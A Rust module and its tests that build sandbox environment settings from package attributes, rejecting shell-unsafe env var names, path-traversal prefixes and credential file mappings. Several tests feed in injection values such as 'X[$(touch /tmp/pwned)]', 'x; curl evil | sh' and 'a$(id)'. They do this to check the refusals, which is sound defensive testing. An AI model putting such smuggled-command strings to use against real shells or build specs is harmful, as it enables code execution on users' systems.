use std::{
    collections::{BTreeMap, BTreeSet},
    path::PathBuf,
};

use crate::env_mapping::{EnvFsMapping, EnvMappingClass, EnvMappingKind};
use crate::{BuildSpecRef, Graph};
use decode::AttrValue;
use mfile::EnvPatches;

/// An env var name the shell helpers can export without re-evaluation:
/// exactly a bash identifier. Anything else — array subscripts, command
/// substitutions, spaces — would be evaluated by `declare` or split the
/// daemon-to-helper line protocol, so it is rejected before it ever
/// reaches a shell.
pub fn is_valid_env_var_name(name: &str) -> bool {
    let mut chars = name.chars();
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// The refusal for a package's `env_state_wiring` env_var that fails
/// [`is_valid_env_var_name`]. The package graph and the session composition
/// both refuse such a name with this text. The values are escaped, so a
/// newline or an escape sequence in one prints as text and the refusal stays
/// one line. The prefix has its own rule and text, [`mfile::is_state_prefix`]
/// and [`mfile::state_prefix_refusal`].
pub fn env_var_refusal(package: &str, env_var: &str) -> String {
    format!(
        "package `{}` declares `env_state_wiring` with env_var \"{}\". The name must be \
         letters, digits and `_`, and not start with a digit.",
        package.escape_debug(),
        env_var.escape_debug(),
    )
}

/// Describes sandbox configuration that needs to be set to power present packages.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SetupForPackages {
    /// Environment variables that need to be set, typically for an env_state_wiring entry.
    pub env_vars: BTreeMap<String, String>,
    /// Directories that should be created in `/state`, typically from an env_state_wiring entry.
    pub state_dirs: BTreeSet<String>,

    /// Whether any package sets `needs.dns`.
    pub needs_dns: bool,
    /// Whether any package sets `needs.internet`.
    pub needs_internet: bool,
    /// The filesystem mappings accumulated from `env_file_mappings` and `env_dir_mappings` attrs.
    pub fs_mappings: EnvPatches,
    /// Which package contributed each entry of `fs_mappings`, keyed by the
    /// path exactly as the package declared it (`~/`-rooted paths are not
    /// expanded here). Last writer wins, matching `fs_mappings` itself.
    ///
    /// Consumed when a mapping can't be honoured, so the error can name the
    /// package to go and look at rather than only the path it landed on.
    pub fs_mapping_packages: BTreeMap<String, String>,
}

impl SetupForPackages {
    /// Computes environment settings that need to be applied to an environment containing the
    /// given packages.
    ///
    /// It is expected that the iterator exhaustively enumerates all packages in an environment, i.e.
    /// contains all runtime deps.
    ///
    /// This returns settings derived from attributes.
    pub fn build<'a, I: IntoIterator<Item = &'a BuildSpecRef>>(
        g: &'a Graph,
        i: I,
    ) -> Result<SetupForPackages, std::io::Error> {
        let mut patch = EnvPatches::default();
        let mut fs_mapping_packages: BTreeMap<String, String> = Default::default();
        let (mut needs_dns, mut needs_internet) = (false, false);
        let mut env_vars: BTreeMap<String, String> = Default::default();
        let mut state_dirs = BTreeSet::default();

        for dep in i.into_iter() {
            let b = g.get(dep).unwrap();
            for mapping in EnvFsMapping::decode_all(b)? {
                // TODO(secrets): credential-class mappings are dropped rather
                // than routed through a separate secrets channel, matching
                // what the session-composition path already does in
                // `minimald`'s `extract_fs_mappings`. Until the secrets
                // strategy lands they simply aren't seen by the sandbox —
                // which is also what keeps a task running inside the guest
                // from trying to mount host credentials that aren't there
                // (#1204).
                if mapping.class == EnvMappingClass::Credential {
                    tracing::warn!(
                        package = %b.name,
                        attr = %mapping.kind.attr(),
                        path = %mapping.path,
                        "dropping Credential-class fs mapping; the secrets strategy is \
                         deferred, so credentials do not reach the sandbox through package \
                         attributes",
                    );
                    continue;
                }
                let setting = if mapping.read_only {
                    mfile::PatchSetting::ReadOnly
                } else {
                    mfile::PatchSetting::ReadWrite
                };
                fs_mapping_packages.insert(mapping.path.clone(), b.name.clone());
                match mapping.kind {
                    EnvMappingKind::Dir => patch.dir.insert(mapping.path, setting),
                    EnvMappingKind::File => patch.file.insert(mapping.path, setting),
                };
            }
            if let Some(wiring) = b.attrs.get("env_state_wiring") {
                let mut apply_wiring = |entry: &AttrValue| -> Result<(), std::io::Error> {
                    let entry = entry.as_map().unwrap();
                    let env_var = entry.get("env_var").unwrap().as_string().unwrap().clone();
                    let prefix = entry.get("prefix").unwrap().as_string().unwrap().clone();
                    // The prefix is joined onto the state dir and printed by
                    // the shell helpers in an `export` line, so it must be one
                    // directory name in the set `is_state_prefix` allows.
                    if !mfile::is_state_prefix(&prefix) {
                        return Err(std::io::Error::new(
                            std::io::ErrorKind::InvalidData,
                            mfile::state_prefix_refusal(&b.name, &prefix),
                        ));
                    }

                    // The variable name is handed verbatim to the shell
                    // helpers' `set_env` branch: bash evaluates a `declare`'d
                    // name for array subscripts, so a crafted name executes
                    // code in the user's live shell. The nickel contract
                    // rejects such a name where it runs; this check keeps the
                    // helpers safe from any spec it did not check. The
                    // refusal escapes the name, as it reaches the helper as a
                    // single `error:` line.
                    if !is_valid_env_var_name(&env_var) {
                        return Err(std::io::Error::new(
                            std::io::ErrorKind::InvalidData,
                            env_var_refusal(&b.name, &env_var),
                        ));
                    }

                    mfile::File::validate_state_component(&prefix).map_err(|reason| {
                        std::io::Error::new(
                            std::io::ErrorKind::InvalidData,
                            format!(
                                "package {} declares a state dir prefix {prefix:?} that cannot \
                                 be used: {reason}",
                                b.name
                            ),
                        )
                    })?;

                    state_dirs.insert(prefix.clone());

                    env_vars.insert(
                        env_var,
                        PathBuf::from("/state")
                            .join(prefix)
                            .to_str()
                            .unwrap()
                            .to_string(),
                    );
                    Ok(())
                };

                match wiring {
                    decode::AttrValue::List(l) => l.iter().try_for_each(apply_wiring)?,
                    decode::AttrValue::Map(_) => apply_wiring(wiring)?,
                    _ => todo!("error for unhandled env_state_wiring AttrValue variant"),
                }
            }

            needs_dns |= b.abstract_deps.get("dns").is_some();
            needs_internet |= b.abstract_deps.get("internet").is_some();
        }

        Ok(SetupForPackages {
            env_vars,
            fs_mappings: patch,
            fs_mapping_packages,
            state_dirs,
            needs_dns,
            needs_internet,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{BuildSpec, Graph};
    use decode::Layer;
    use indoc::indoc;
    use mfile::PatchSetting;
    use nickel_lang_core::term::IndexMap;

    /// `class = 'Credential` mappings are dropped here, matching what the
    /// session-composition path (`minimald`'s `extract_fs_mappings`) already
    /// did; `class = 'State` ones survive and remember the package that
    /// declared them. Regression guard for #1204, where a credential file a
    /// package declared as `~/.claude.json` reached a guest task's sandbox
    /// and was created at `/` on a read-only rootfs.
    #[test]
    fn fs_mappings_drop_credential_class() {
        let layer = Layer::new_for_test(
            indoc! {
                "
            let {BuildSpec, ..} = import \"minimal.ncl\" in

            let
                b1 = {
                    name = \"b1\",
                    build_deps = [],
                    cmd = \"\",
                    attrs = {
                        env_dir_mappings = [{ read_only = false, path = \"~/.claude\", class = 'State }],
                        env_file_mappings = [{ read_only = false, path = \"~/.claude.json\", class = 'Credential }],
                    },
                } | BuildSpec,
                b2 = {
                    name = \"b2\",
                    build_deps = [],
                    cmd = \"\",
                } | BuildSpec,
                b3 = {
                    name = \"b3\",
                    build_deps = [],
                    cmd = \"\",
                } | BuildSpec,
            in
            [b1, b2, b3]
            "
            }
            .to_string(),
        )
        .unwrap_or_else(|e| {
            e.report_to_stderr();
            panic!("spec parsing failed");
        });

        let g = Graph::new().ingest(layer).unwrap();

        assert_eq!(
            SetupForPackages::build(&g, [g.by_name("b1").unwrap()]).unwrap(),
            SetupForPackages {
                env_vars: Default::default(),
                needs_dns: false,
                needs_internet: false,
                state_dirs: Default::default(),
                fs_mappings: EnvPatches {
                    dir: BTreeMap::from_iter([("~/.claude".to_string(), PatchSetting::ReadWrite)]),
                    file: BTreeMap::new(),
                },
                fs_mapping_packages: BTreeMap::from_iter([(
                    "~/.claude".to_string(),
                    "b1".to_string()
                )]),
            }
        )
    }

    /// An entry the typed decode can't classify stops the whole setup with
    /// an error naming the package, rather than reaching the sandbox as an
    /// unclassified — and therefore unfiltered — mapping. This is what the
    /// old `class` string comparison could not do: it answered "not
    /// `Credential`" for anything it didn't recognise and let the mapping
    /// through.
    #[test]
    fn an_unclassifiable_mapping_fails_the_whole_setup() {
        let layer = Layer::new_for_test(
            indoc! {
                "
            let {BuildSpec, ..} = import \"minimal.ncl\" in

            let
                b1 = {
                    name = \"b1\",
                    build_deps = [],
                    cmd = \"\",
                    attrs = {
                        env_file_mappings = [{ read_only = false, path = \"~/.claude.json\" }],
                    },
                } | BuildSpec,
            in
            [b1]
            "
            }
            .to_string(),
        )
        // Nickel's own `class | [| 'Credential, 'State |]` contract does not
        // catch this: a record contract's undefined field is lazy, so an
        // entry that simply omits `class` evaluates cleanly and arrives here
        // unclassified. That is precisely the case the old string comparison
        // waved through.
        .expect("nickel accepts an entry that omits `class`");
        let g = Graph::new().ingest(layer).unwrap();

        let err = SetupForPackages::build(&g, [g.by_name("b1").unwrap()])
            .expect_err("an entry with no class must not decode");
        assert_eq!(err.kind(), std::io::ErrorKind::InvalidData);
        assert!(
            err.to_string().contains("b1") && err.to_string().contains("class"),
            "the error must name the package and the offending field, got {err}"
        );
    }

    /// A state-dir prefix that is not a single directory name would be
    /// joined onto the host state base, so it is refused rather than
    /// mounted.
    #[test]
    fn a_state_dir_prefix_that_is_not_a_single_component_fails_the_whole_setup() {
        let layer = Layer::new_for_test(
            indoc! {
                "
            let {BuildSpec, ..} = import \"minimal.ncl\" in

            {
                name = \"b1\",
                build_deps = [],
                cmd = \"\",
                attrs = {
                    env_state_wiring = [{ env_var = \"GOCACHE\", prefix = \"..\" }],
                },
            } | BuildSpec
            "
            }
            .to_string(),
        )
        .expect("nickel accepts a `..` prefix");
        let g = Graph::new().ingest(layer).unwrap();

        let err = SetupForPackages::build(&g, [g.by_name("b1").unwrap()])
            .expect_err("a `..` prefix must not become a state dir");
        assert_eq!(err.kind(), std::io::ErrorKind::InvalidData);
        assert!(
            err.to_string().contains("b1") && err.to_string().contains("prefix"),
            "the error must name the package and the offending field, got {err}"
        );
    }

    #[test]
    fn detects_needs() {
        let layer = Layer::new_for_test(
            indoc! {
                "
            let {BuildSpec, ..} = import \"minimal.ncl\" in

            let rec
                b1 = {
                    name = \"b1\",
                    build_deps = [],
                    cmd = \"\",
                    needs.internet = true,
                    needs.dns = true,
                } | BuildSpec,
                b2 = {
                    name = \"b2\",
                    build_deps = [],
                    runtime_deps = [b1],
                    cmd = \"\",
                } | BuildSpec,
                b3 = {
                    name = \"b3\",
                    build_deps = [],
                    runtime_deps = [b2],
                    cmd = \"\",
                } | BuildSpec,
            in
            b3
            "
            }
            .to_string(),
        )
        .unwrap_or_else(|e| {
            e.report_to_stderr();
            panic!("spec parsing failed");
        });

        let g = Graph::new().ingest(layer).unwrap();

        assert_eq!(
            SetupForPackages::build(&g, [g.by_name("b1").unwrap()]).unwrap(),
            SetupForPackages {
                env_vars: Default::default(),
                needs_dns: true,
                needs_internet: true,
                state_dirs: Default::default(),
                fs_mappings: Default::default(),
                fs_mapping_packages: Default::default(),
            }
        )
    }

    #[test]
    fn detects_state_wiring() {
        let layer = Layer::new_for_test(
            indoc! {
                "
            let {BuildSpec, ..} = import \"minimal.ncl\" in

            {
                name = \"b1\",
                build_deps = [],
                cmd = \"\",
                attrs.env_state_wiring = [
                  {
                    env_var = \"GOCACHE\",
                    prefix = \"gocache\",
                  },
                  {
                    env_var = \"GOMODCACHE\",
                    prefix = \"gomodcache\",
                  },
                ],
            } | BuildSpec
            "
            }
            .to_string(),
        )
        .unwrap_or_else(|e| {
            e.report_to_stderr();
            panic!("spec parsing failed");
        });

        let g = Graph::new().ingest(layer).unwrap();

        assert_eq!(
            SetupForPackages::build(&g, [g.by_name("b1").unwrap()]).unwrap(),
            SetupForPackages {
                env_vars: BTreeMap::from_iter([
                    ("GOCACHE".to_string(), "/state/gocache".to_string(),),
                    ("GOMODCACHE".to_string(), "/state/gomodcache".to_string(),)
                ]),
                needs_dns: false,
                needs_internet: false,
                state_dirs: BTreeSet::from_iter(["gocache".to_string(), "gomodcache".to_string()]),
                fs_mappings: Default::default(),
                fs_mapping_packages: Default::default(),
            }
        )
    }

    /// A state-dir prefix that is not a single directory name would be
    /// joined onto the host state base, so it is refused rather than
    /// mounted. The spec is inserted by hand, so the graph's own check is
    /// what refuses it, whatever the nickel contract does; each value that
    /// is not one directory component gets the one prefix refusal.
    #[test]
    fn a_state_dir_prefix_that_is_not_a_single_component_fails_the_whole_setup() {
        for prefix in ["..", ".", "", "a/b", "/abs", "a\0b"] {
            let mut g = Graph::new();
            let b1 = g.insert_build(BuildSpec {
                name: "b1".into(),
                attrs: IndexMap::from_iter([(
                    "env_state_wiring".to_string(),
                    decode::AttrValue::List(vec![decode::AttrValue::Map(IndexMap::from_iter([
                        (
                            "env_var".to_string(),
                            decode::AttrValue::String("GOCACHE".to_string(), None),
                        ),
                        (
                            "prefix".to_string(),
                            decode::AttrValue::String(prefix.to_string(), None),
                        ),
                    ]))]),
                )]),
                ..Default::default()
            });

            let err = SetupForPackages::build(&g, [&b1])
                .expect_err("a prefix that is not one directory name must not become a state dir");
            assert_eq!(err.kind(), std::io::ErrorKind::InvalidData, "{prefix:?}");
            assert_eq!(
                err.to_string(),
                mfile::state_prefix_refusal("b1", prefix),
                "the one prefix refusal"
            );
        }
    }

    /// The graph re-checks the wiring entry shapes the helpers export
    /// verbatim. The nickel contract is the first gate where it runs, but a
    /// `BuildSpec` can also arrive with attrs intact and no contract ever
    /// applied — this test drives the re-check down that path by inserting
    /// specs by hand.
    #[test]
    fn a_shell_unsafe_wiring_entry_fails_the_whole_setup() {
        let wiring = |env_var: &str, prefix: &str| {
            decode::AttrValue::Map(IndexMap::from_iter([
                (
                    "env_var".to_string(),
                    decode::AttrValue::String(env_var.to_string(), None),
                ),
                (
                    "prefix".to_string(),
                    decode::AttrValue::String(prefix.to_string(), None),
                ),
            ]))
        };

        // The control: a plain entry passes the same path.
        let mut g = Graph::new();
        let ok = g.insert_build(BuildSpec {
            name: "ok".into(),
            attrs: IndexMap::from_iter([(
                "env_state_wiring".to_string(),
                wiring("GOCACHE", "gocache"),
            )]),
            ..Default::default()
        });
        let setup = SetupForPackages::build(&g, [&ok]).expect("a plain entry");
        assert_eq!(
            setup.env_vars.get("GOCACHE"),
            Some(&"/state/gocache".to_string())
        );

        let mut g = Graph::new();
        let evil = g.insert_build(BuildSpec {
            name: "evil".into(),
            attrs: IndexMap::from_iter([(
                "env_state_wiring".to_string(),
                wiring("X[$(touch /tmp/pwned)]", "gocache"),
            )]),
            ..Default::default()
        });

        let err = SetupForPackages::build(&g, [&evil])
            .expect_err("a shell-unsafe env_var must fail the whole setup");
        assert_eq!(err.kind(), std::io::ErrorKind::InvalidData);
        assert!(
            err.to_string().contains("evil"),
            "the error must name the package, got {err}"
        );

        let mut g = Graph::new();
        let evil = g.insert_build(BuildSpec {
            name: "evil".into(),
            attrs: IndexMap::from_iter([(
                "env_state_wiring".to_string(),
                wiring("GOCACHE", "cache/artifacts"),
            )]),
            ..Default::default()
        });

        let err = SetupForPackages::build(&g, [&evil])
            .expect_err("a multi-component prefix must fail the whole setup");
        assert_eq!(err.kind(), std::io::ErrorKind::InvalidData);
        assert!(
            err.to_string().contains("evil"),
            "the error must name the package, got {err}"
        );

        // The errors quote the refused value. A newline in it would end
        // the `error:` line the helper reads, so it is escaped.
        for (env_var, prefix) in [("A\nB", "gocache"), ("GOCACHE", "a\nb")] {
            let mut g = Graph::new();
            let evil = g.insert_build(BuildSpec {
                name: "evil".into(),
                attrs: IndexMap::from_iter([(
                    "env_state_wiring".to_string(),
                    wiring(env_var, prefix),
                )]),
                ..Default::default()
            });
            let err = SetupForPackages::build(&g, [&evil])
                .expect_err("a value with a newline must fail the whole setup");
            let msg = err.to_string();
            assert!(
                !msg.contains('\n') && msg.contains("\\n"),
                "the refused value must be escaped onto one line, got {msg:?}"
            );
        }

        // the name rule at its edges; the prefix rule's list is
        // `STATE_PREFIXES`, checked by `the_prefix_rule_and_the_contract_agree`
        for ok in ["GOCACHE", "_x", "a1"] {
            assert!(is_valid_env_var_name(ok), "{ok}");
        }
        for bad in ["", "1a", "a-b", "a b", "a[0]", "a=b", "é"] {
            assert!(!is_valid_env_var_name(bad), "{bad:?}");
        }
    }

    /// Prefixes, and whether a package may declare each. The accepted ones
    /// begin with every prefix the package tree declares today. The refused
    /// ones cover each class of character the set leaves out: a path, the
    /// helper's line framing, a control character, non-ASCII, and each
    /// character a shell reads as syntax in the printed `export` line.
    const STATE_PREFIXES: &[(&str, bool)] = &[
        // the package tree's prefixes
        ("actions-runner", true),
        ("bun-cache", true),
        ("cargo", true),
        ("deno-cache", true),
        ("gocache", true),
        ("gomodcache", true),
        ("gradle", true),
        ("jbang", true),
        ("maven", true),
        ("mvnd", true),
        ("npm-cache", true),
        ("uv-cache", true),
        ("zig-cache", true),
        ("zig-global-cache", true),
        // the rest of the set, at its edges
        ("go-mod_cache.v2", true),
        ("UPPER9", true),
        ("...", true),
        ("-x", true),
        // a path, or not one name
        ("", false),
        (".", false),
        ("..", false),
        ("a/b", false),
        ("/abs", false),
        ("cache/artifacts", false),
        // the helper's line framing
        ("a:b", false),
        ("a\\b", false),
        // control characters: C0, DEL, C1
        ("a\0b", false),
        ("a\nb", false),
        ("a\rb", false),
        ("a\tb", false),
        ("a\u{1b}[2Jb", false),
        ("a\u{7f}b", false),
        ("a\u{85}b", false),
        ("a\u{9f}b", false),
        // non-ASCII
        ("cach\u{e9}", false),
        ("a\u{a0}b", false),
        // shell syntax in `export GOCACHE=/state/<prefix>`
        ("x; curl evil | sh", false),
        ("a b", false),
        ("a;b", false),
        ("a|b", false),
        ("a&b", false),
        ("a$(id)", false),
        ("a${HOME}", false),
        ("a$b", false),
        ("a`id`", false),
        ("a>b", false),
        ("a<b", false),
        ("a(b)", false),
        ("a{b,c}", false),
        ("a*", false),
        ("a?", false),
        ("a[b]", false),
        ("~a", false),
        ("a'b", false),
        ("a\"b", false),
        ("a#b", false),
        ("a=b", false),
        ("a!b", false),
        ("a%b", false),
    ];

    /// `s` as a Nickel string literal that evaluates to `s` exactly.
    fn nickel_string(s: &str) -> String {
        let mut out = String::from("\"");
        for c in s.chars() {
            match c {
                '\\' => out.push_str("\\\\"),
                '"' => out.push_str("\\\""),
                '%' => out.push_str("\\%"),
                // `\u{1b}`, which is Nickel's escape too
                c if c.is_control() => out.extend(c.escape_unicode()),
                c => out.push(c),
            }
        }
        out.push('"');
        out
    }

    /// Loads `src` as a layer. A refusal comes back as the report a person
    /// reads.
    fn load_report(src: String) -> Result<Layer, String> {
        Layer::new_for_test(src).map_err(|e| {
            let mut buf = codespan_reporting::term::termcolor::NoColor::new(Vec::new());
            e.report_to(&mut buf);
            String::from_utf8_lossy(&buf.into_inner()).into_owned()
        })
    }

    /// Loads a one-package layer whose wiring has `prefix`, written as the
    /// package tree writes its attrs: `attrs = { .. } | Attrs`. On this line
    /// that is the shape whose attrs contract runs when the spec loads, as
    /// the reader does not apply `BuildSpec`'s own `attrs | Attrs`.
    fn load_with_prefix(prefix: &str) -> Result<Layer, String> {
        load_report(format!(
            "let {{BuildSpec, Attrs, ..}} = import \"minimal.ncl\" in\n\
             {{ name = \"p\", build_deps = [], cmd = \"\", \
             attrs = {{ env_state_wiring = [{{ env_var = \"GOCACHE\", prefix = {} }}] }} | Attrs }} \
             | BuildSpec\n",
            nickel_string(prefix)
        ))
    }

    /// Loads the same entry checked by the `env_state_wiring` class's own
    /// contract. On this line `Attrs` reports a refused attribute only as
    /// "failed to validate env_state_wiring"; the class's contract reports
    /// the rule's own message.
    fn load_through_class_contract(prefix: &str) -> Result<Layer, String> {
        load_report(format!(
            "let {{BuildSpec, ..}} = import \"minimal.ncl\" in\n\
             let classes = import \"attr_classes.ncl\" in\n\
             {{ name = \"p\", build_deps = [], cmd = \"\", \
             attrs.env_state_wiring = ([{{ env_var = \"GOCACHE\", prefix = {} }}] \
             | classes.env_state_wiring.validate) }} | BuildSpec\n",
            nickel_string(prefix)
        ))
    }

    /// The daemon's prefix rule (`mfile::is_state_prefix`) and the Nickel
    /// contract on `env_state_wiring` accept and refuse the same prefixes.
    /// An accepted one loads and becomes `/state/<prefix>`; a refused one is
    /// refused at load, by the prefix rule's own message where the class's
    /// contract reports it, and again by the graph for a spec that no
    /// contract checked.
    #[test]
    fn the_prefix_rule_and_the_contract_agree() {
        for &(prefix, accepted) in STATE_PREFIXES {
            assert_eq!(mfile::is_state_prefix(prefix), accepted, "rule: {prefix:?}");
            match (load_with_prefix(prefix), accepted) {
                (Ok(layer), true) => {
                    let g = Graph::new().ingest(layer).unwrap();
                    let setup = SetupForPackages::build(&g, [g.by_name("p").unwrap()])
                        .unwrap_or_else(|e| panic!("{prefix:?}: {e}"));
                    assert_eq!(
                        setup.env_vars.get("GOCACHE"),
                        Some(&format!("/state/{prefix}")),
                        "{prefix:?}"
                    );
                }
                (Err(report), true) => panic!("contract refused {prefix:?}:\n{report}"),
                (Ok(_), false) => panic!("contract accepted {prefix:?}"),
                (Err(report), false) => assert!(
                    report.contains("failed to validate env_state_wiring"),
                    "{prefix:?} was refused for another reason:\n{report}"
                ),
            }
            match (load_through_class_contract(prefix), accepted) {
                (Ok(_), true) => {}
                (Err(report), true) => panic!("class contract refused {prefix:?}:\n{report}"),
                (Ok(_), false) => panic!("class contract accepted {prefix:?}"),
                (Err(report), false) => assert!(
                    report.contains("env_state_wiring's prefix must be one directory name"),
                    "{prefix:?} was refused for another reason:\n{report}"
                ),
            }

            let mut g = Graph::new();
            let b1 = g.insert_build(BuildSpec {
                name: "b1".into(),
                attrs: IndexMap::from_iter([(
                    "env_state_wiring".to_string(),
                    decode::AttrValue::Map(IndexMap::from_iter([
                        (
                            "env_var".to_string(),
                            decode::AttrValue::String("GOCACHE".to_string(), None),
                        ),
                        (
                            "prefix".to_string(),
                            decode::AttrValue::String(prefix.to_string(), None),
                        ),
                    ])),
                )]),
                ..Default::default()
            });
            match SetupForPackages::build(&g, [&b1]) {
                Ok(_) => assert!(accepted, "graph accepted {prefix:?}"),
                Err(e) => {
                    assert!(!accepted, "graph refused {prefix:?}: {e}");
                    assert_eq!(e.to_string(), mfile::state_prefix_refusal("b1", prefix));
                }
            }
        }
    }

    /// The same packages walked in opposite orders yield the same env-var,
    /// fs-mapping and package-attribution key sequences and the same
    /// state-dir set: the ordered collections take their order from their
    /// keys, not from the walk, so the sandbox setup is stable run to run.
    #[test]
    fn build_is_walk_order_independent() {
        let layer = Layer::new_for_test(
            indoc! {
                "
            let {BuildSpec, ..} = import \"minimal.ncl\" in

            let
                b1 = {
                    name = \"b1\",
                    build_deps = [],
                    cmd = \"\",
                    attrs = {
                        env_state_wiring = [{ env_var = \"AVAR\", prefix = \"adir\" }],
                        env_dir_mappings = [{ read_only = false, path = \"~/a\", class = 'State }],
                    },
                } | BuildSpec,
                b2 = {
                    name = \"b2\",
                    build_deps = [],
                    cmd = \"\",
                    attrs = {
                        env_state_wiring = [{ env_var = \"BVAR\", prefix = \"bdir\" }],
                        env_dir_mappings = [{ read_only = false, path = \"~/b\", class = 'State }],
                    },
                } | BuildSpec,
            in
            [b1, b2]
            "
            }
            .to_string(),
        )
        .unwrap_or_else(|e| {
            e.report_to_stderr();
            panic!("spec parsing failed");
        });

        let g = Graph::new().ingest(layer).unwrap();
        let (b1, b2) = (g.by_name("b1").unwrap(), g.by_name("b2").unwrap());

        let forward = SetupForPackages::build(&g, [b1, b2]).unwrap();
        let reverse = SetupForPackages::build(&g, [b2, b1]).unwrap();

        let keys = |m: &BTreeMap<String, String>| m.keys().cloned().collect::<Vec<_>>();
        assert_eq!(keys(&forward.env_vars), keys(&reverse.env_vars));
        assert_eq!(
            keys(&forward.fs_mapping_packages),
            keys(&reverse.fs_mapping_packages)
        );
        assert_eq!(
            forward.fs_mappings.dir.keys().collect::<Vec<_>>(),
            reverse.fs_mappings.dir.keys().collect::<Vec<_>>()
        );
        assert_eq!(forward.state_dirs, reverse.state_dirs);
    }
}
